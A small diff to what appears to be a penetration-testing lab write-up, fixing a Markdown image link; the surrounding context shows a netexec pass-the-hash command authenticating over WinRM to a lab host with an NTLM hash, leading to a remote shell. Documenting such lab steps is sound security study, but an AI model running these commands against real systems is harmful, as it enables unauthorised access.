@@ -181,7 +181,7 @@ Authenticate using hash
 netexec winrm 192.168.141.129 -u SQLService -H f4ab68f27303bcb4024650d8fc5f973a
 ```
 
-[verify](Images/verify.png)
+![verify](Images/verify.png)
 
 Obtain WinRM shell
 ```
